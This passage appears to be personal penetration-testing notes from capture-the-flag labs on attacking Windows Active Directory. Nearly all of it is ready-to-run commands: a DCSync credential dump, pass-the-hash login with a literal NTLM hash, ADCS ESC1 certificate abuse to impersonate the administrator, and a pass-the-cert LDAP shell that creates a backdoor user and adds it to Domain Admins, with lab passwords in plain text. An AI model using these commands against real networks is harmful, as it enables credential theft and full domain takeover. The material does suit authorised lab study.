

#### DCSync Attack

```bash
 impacket-secretsdump -dc-ip spookysec.local 'spookysec.local/backup:backup2517860@spookysec.local'
```

#### Pass the Hash 

```bash
 evil-winrm -u administrator -H '0e0363213e37b94221497260b0bcb4fc' -i spookysec.local
```

## Certificate Exploitation 

https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-adcs/

- Enumerate

```
 certipy-ad find -vulnerable -u 'thm@lunar.eruca.com' -p 'Password1@' -dc-ip 10.10.235.121 -stdout

```


#### ESC1

>[!NOTE]
>if rpc_s_access_denied, then check for user/password typo
>if connection timedout, retry after few secs

```bash
certipy-ad req -u 'thm@lunar.eruca.com' -ca 'LUNAR-LUNDC-CA' -template 'HTTPSWebServer' -upn 'administrator@lunar.eruca.com' -dc-ip 10.10.235.121 -debug


certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'lunar.eruca.com' -dc-ip 10.10.235.121

```

>[!INFO]
>[-] Got error while trying to request TGT: Kerberos SessionError:  
KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type), the error means the KDC is not set up for Kerberos authentication and the Domain Controller does not support PKINIT. The PassTheCert tool allows us to bypass that by authenticating via LDAP(S).

- pass-the-cert.py
```bash
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt  

certipy-ad cert -pfx administrator.pfx -nocert -out user.key  

python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain lunar.eruca.com -dc-ip 10.10.235.121

# add_user arth0s
# change_password arth0s Whatever13
# add_user_to_group arth0s Administrators  
# add_user_to_group arth0s "Domain Admins"
evil-winrm -i 10.10.235.121 -u arth0s -p Whatever13 
```

- Exploiting with addComputer and using that account with Machine template, https://arth0s.medium.com/hackthebox-authority-write-up-ebef7cb8a41a
```bash
impacket-addcomputer 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'

certipy-ad req -u 'THMPC$@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
```

References:
- https://arth0s.medium.com/hackthebox-authority-write-up-ebef7cb8a41a

